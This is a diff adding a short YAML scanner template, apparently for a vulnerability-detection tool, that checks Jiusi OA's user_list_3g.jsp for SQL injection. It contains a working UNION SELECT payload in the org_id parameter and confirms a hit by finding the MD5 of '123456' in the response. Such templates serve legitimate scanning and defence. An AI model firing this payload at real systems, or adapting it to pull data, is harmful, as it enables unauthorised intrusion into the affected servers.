@@ -1,0 +1,11 @@
+name: 九思OA-user_list_3g-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0%20%20union/**/select/**/1,concat(111*111,md5(123456))%20%23&userIds=1&userNames=1&content=1
+    expression:
+      status: 200
+      body_all: ["e10adc3949ba59abbe56e057f20f883e"]
